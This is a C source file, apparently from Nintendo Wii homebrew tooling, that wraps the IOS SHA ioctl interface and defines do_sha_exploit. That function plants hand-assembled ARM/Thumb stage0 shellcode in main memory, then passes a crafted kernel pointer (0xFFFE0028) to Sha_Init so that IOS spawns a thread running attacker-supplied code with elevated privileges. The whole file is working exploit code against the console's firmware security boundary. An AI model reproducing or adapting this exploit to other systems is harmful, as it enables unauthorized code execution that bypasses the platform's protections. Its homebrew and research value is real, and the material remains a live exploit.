#include <string.h>
#include <unistd.h>
#include <ogc/system.h>
#include <ogc/cache.h>
#include <ogc/ipc.h>

#include "common.h"
#include "sha.h"
#include "stage1_bin.h"
#include "stage1/source/shared.h"

int Sha_Init(ShaContext* ctx) {
	ioctlv vectors[3] = {};

	vectors[1].data = ctx;
	if ((uintptr_t)ctx < 0xFFF00000)
		vectors[1].len  = sizeof *ctx;

	return IOS_Ioctlv(0x10001, 0, 1, 2, vectors);
}

int Sha_Update(ShaContext* ctx, void* data, unsigned size) {
	int ret = 0;
	ioctlv vectors[3] = {};

	vectors[1].data = ctx;
	vectors[1].len  = sizeof *ctx;

	for (unsigned x = 0; x < size;) {
		unsigned len = size - x;
		if (len > 0x10000)
			len = 0x10000;

		vectors[0].data = data + x;
		vectors[0].len  = len;

		ret = IOS_Ioctlv(0x10001, 1, 1, 2, vectors);
		if (ret < 0)
			break;

		x += len;
	}

	return ret;
}

int Sha_Finish(ShaContext* ctx, uint32_t* hash) {
	ioctlv vectors[3] = {};

	vectors[1].data = ctx;
	vectors[1].len  = sizeof *ctx;

	vectors[2].data = hash;
	vectors[2].len  = sizeof(uint32_t[5]);

	return IOS_Ioctlv(0x10001, 2, 1, 2, vectors);
}

static const uint32_t stage0[10] = {
	// .thumb
	// _start:
	0x4906468d, // ldr r1, =0x10100000; mov sp, r1;
	0x48064907, // ldr r0, =0xdeadbeef; ldr r1, =0x0badc0de;
	0x478846c0, // blx r1; align(2)
	0x477846c0, // bx pc; nop
	// .arm
	// chill:
	0xe3a00000, // mov r0, #0x0
	0xee070f90, // mcr p15, 0, r0, c7, c0, 4 ; Wait for interrupt
	0xeafffffc, // b chill
	// .pool
	0x10100000,
	0xdeadbeef,
	0x0badc0de,
};

/*
 * https://github.com/mkw-sp/mkw-sp/blob/main/common/IOS.cc#L192
 * thank you mkwcat (<3)
 */
int do_sha_exploit(const void *entrypoint, bool thumb, void *argument, void *stack_base, unsigned stack_size, int8_t priority, uint32_t pid) {
	struct thread_parameters params = {
		.entrypoint = (int (*)(void *))(MEM_VIRTUAL_TO_PHYSICAL(entrypoint) | thumb),
		.argument   = (void *)MEM_VIRTUAL_TO_PHYSICAL(argument),
		.stack_top  = (void *)MEM_VIRTUAL_TO_PHYSICAL(stack_base + stack_size),
		.stack_size = stack_size,
		.priority   = priority,
		.pid        = pid,
	};


	uint32_t *mem1 = (uint32_t *)SYS_BASE_CACHED;
	memcpy(mem1, stage0, sizeof stage0);
	mem1[8] = (uint32_t)MEM_VIRTUAL_TO_PHYSICAL(&params);
	mem1[9] = (uint32_t)MEM_VIRTUAL_TO_PHYSICAL(stage1_bin) | 1;
	DCFlushRange(mem1, sizeof stage0);

	volatile int* threadid = (volatile int *)(SYS_BASE_UNCACHED + sizeof stage0);
	*threadid = 0;
	params.threadid_out = (int *)(sizeof stage0);
	DCFlushRange(&params, sizeof params);


	int ret = Sha_Init((void *)0xFFFE0028);
	if (ret == 0) {
		int timer = 1000;
		while (!(ret = *threadid)) {
			usleep(1000);
			if (timer-- == 0) {
				errorf("timeout waiting on IOS thread to spawn");
				return -1;
			}
		}
	}

	return ret;
}
